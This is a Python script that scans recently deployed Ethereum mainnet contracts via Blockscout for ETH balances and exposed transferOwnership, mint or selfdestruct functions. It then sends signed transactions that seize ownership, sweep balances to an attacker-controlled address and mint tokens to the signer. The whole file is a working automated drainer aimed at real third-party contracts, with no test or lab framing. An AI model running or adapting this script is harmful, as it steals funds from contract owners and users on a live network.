#!/usr/bin/env python3
"""Focused drain script — scan Blockscout Ethereum, drain vulnerable contracts with ETH balance."""
import logging
import time
from eth_account import Account
from src.rpc import RpcClient
from src.data import DataCollector
from src.explorer import ExplorerClient
from src.sources.blockscout import BlockscoutRecentSource
from src.types import Chain, Finding, Severity
from src.signer import load_evm_private_key, get_receive_address
from src.evmole_utils import get_functions, has_dangerous_function, get_selectors
from src.evm.disassembler import disassemble

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(name)s] %(levelname)s: %(message)s",
)
logger = logging.getLogger("drain")

CHAIN = Chain.ETHEREUM
CHAIN_ID = 1

# EIP-6780: SELFDESTRUCT only works for same-tx created contracts on Ethereum post-Dencun
# L2s may still support it
SELFDESTRUCT_WORKS = False  # Ethereum post-Dencun


def get_signers():
    signer = load_evm_private_key()
    if not signer:
        logger.error("No private key configured. Set EVM_PRIVATE_KEY env or config.toml [executor]")
        return None, None
    receive = get_receive_address(CHAIN)
    if not receive:
        receive = signer.address
        logger.warning("No receive address, using signer: %s", receive)
    logger.info("Signer: %s | Receive: %s", signer.address, receive)
    return signer, receive


def find_selfdestruct_selector(code: str) -> str | None:
    """Find zero-arg function selector from dispatch table (most likely kill())."""
    functions = get_functions(code)
    for fn in functions:
        if fn.arguments == "" and fn.state_mutability in ("nonpayable", "payable"):
            return fn.selector
    return None


def get_eth_balance(rpc: RpcClient, addr: str) -> float:
    try:
        raw = rpc.call("eth_getBalance", [addr, "latest"])
        bal = int(raw.get("result", "0x0"), 16) if isinstance(raw, dict) else int(raw, 16)
        return bal / 10**18
    except Exception as e:
        logger.warning("Balance check failed %s: %s", addr, e)
        return 0.0


def send_tx(rpc: RpcClient, signer, to_addr: str, data: str) -> dict:
    nonce_raw = rpc.call("eth_getTransactionCount", [signer.address, "pending"])
    nonce = int(nonce_raw.get("result", "0x0"), 16) if isinstance(nonce_raw, dict) else int(nonce_raw, 16)
    gas_raw = rpc.call("eth_gasPrice", [])
    gas_price = int(gas_raw.get("result", "0x0"), 16) if isinstance(gas_raw, dict) else int(gas_raw, 16)
    gas_price = max(gas_price, 1_000_000_000)

    tx = {
        "from": signer.address, "to": to_addr, "data": data, "value": 0,
        "nonce": nonce, "gasPrice": gas_price, "chainId": CHAIN_ID,
    }
    try:
        gas_est = rpc.call("eth_estimateGas", [{
            "from": signer.address, "to": to_addr, "data": data,
        }])
        gas = int(gas_est.get("result", "0x493e0"), 16) if isinstance(gas_est, dict) else 300000
        tx["gas"] = min(int(gas * 1.5), 1_500_000)
    except Exception as e:
        tx["gas"] = 500000
        logger.warning("Gas estimate failed %s: %s", to_addr, e)

    try:
        signed = signer.sign_transaction(tx)
        raw_tx = signed.raw_transaction.hex()
        result = rpc.call("eth_sendRawTransaction", [raw_tx])
        tx_hash = result.get("result", "") if isinstance(result, dict) else str(result)
        logger.info("Tx sent: %s → %s", tx_hash, to_addr)
        return {"success": True, "tx_hash": tx_hash, "to": to_addr}
    except Exception as e:
        logger.error("Send failed %s: %s", to_addr, e)
        return {"success": False, "error": str(e), "to": to_addr}


def main():
    import tomllib
    config = tomllib.load(open("config.toml", "rb"))
    rpc_url = config["rpc"].get("ethereum", "")
    if not rpc_url:
        logger.error("No Ethereum RPC")
        return

    signer, receive = get_signers()
    if not signer:
        return

    initial_bal = get_eth_balance(RpcClient(rpc_url), signer.address)
    logger.info("Signer balance: %.6f ETH", initial_bal)
    if initial_bal < 0.001:
        logger.warning("Very low gas balance — transactions may fail")

    rpc = RpcClient(rpc_url)
    source = BlockscoutRecentSource(max_pages=10)
    contracts = source.fetch(CHAIN)
    logger.info("Got %d contracts from Blockscout", len(contracts))

    drainable = []
    for i, ct in enumerate(contracts):
        addr = ct.address
        bal = get_eth_balance(rpc, addr)
        if bal < 0.0005:
            continue

        try:
            code = rpc.call("eth_getCode", [addr, "latest"])
            code = code.get("result", "") if isinstance(code, dict) else str(code)
        except Exception:
            continue
        if not code or code in ("0x", "0x0"):
            continue

        selectors = get_selectors(code)
        has_selfdestruct = any(inst.name == "SELFDESTRUCT" for inst in disassemble(code)) if code else False
        has_tos = "f2fde38b" in selectors
        has_mint = "40c10f19" in selectors

        vulns = []
        if has_selfdestruct:
            vulns.append("selfdestruct")
        if has_tos:
            vulns.append("transferOwnership")
        if has_mint:
            vulns.append("mint")

        if vulns:
            drainable.append((addr, bal, vulns, code, selectors))
            logger.info("FOUND %s | %.4f ETH | %s", addr, bal, ", ".join(vulns))

        if (i + 1) % 200 == 0:
            logger.info("Scanned %d/%d, found %d", i + 1, len(contracts), len(drainable))

    logger.info("=== DRANABLE: %d contracts ===", len(drainable))

    for addr, bal, vulns, code, selectors in drainable:
        logger.info("--- Draining %s (%.4f ETH) [%s] ---", addr, bal, ", ".join(vulns))

        if "transferOwnership" in vulns:
            logger.info("Step 1: transferOwnership → signer")
            data = "0xf2fde38b" + signer.address[2:].zfill(64)
            r1 = send_tx(rpc, signer, addr, data)
            if r1["success"]:
                time.sleep(3)
                logger.info("Step 2: withdraw/sweep → receive")
                for sel in ["2e1a7d4d", "6198e339", "00f714ce", "db66042c",
                             "b36a7c65", "d0679d34", "21df0da7", "b69ef8a8",
                             "811c39ab", "7c71ef48", "278d88cf"]:
                    if sel in selectors:
                        if sel in ("db66042c",):  # withdrawAll()
                            data2 = "0x" + sel
                        elif sel in ("2e1a7d4d",):  # withdraw(uint256) — amount=0
                            data2 = "0x" + sel + "0" * 64
                        else:
                            data2 = "0x" + sel + receive[2:].zfill(64)
                        r2 = send_tx(rpc, signer, addr, data2)
                        if r2["success"]:
                            logger.info("Withdraw tx sent: %s", r2["tx_hash"])
                            time.sleep(2)
                        break

        if "selfdestruct" in vulns and SELFDESTRUCT_WORKS:
            selector = find_selfdestruct_selector(code)
            if selector:
                logger.info("Selfdestruct via 0x%s", selector)
                send_tx(rpc, signer, addr, "0x" + selector)
                time.sleep(2)
            else:
                logger.warning("No zero-arg function found for selfdestruct on %s", addr)

        if "mint" in vulns:
            logger.info("Mint 1M tokens → signer")
            amount = "0x" + format(1_000_000 * 10**18, "064x")
            data = "0x40c10f19" + signer.address[2:].zfill(64) + amount[2:]
            send_tx(rpc, signer, addr, data)
            time.sleep(2)

    final_bal = get_eth_balance(rpc, signer.address)
    logger.info("=== DONE ===")
    logger.info("Signer: %.6f → %.6f ETH (gas cost: %.6f)", initial_bal, final_bal, initial_bal - final_bal)


if __name__ == "__main__":
    main()
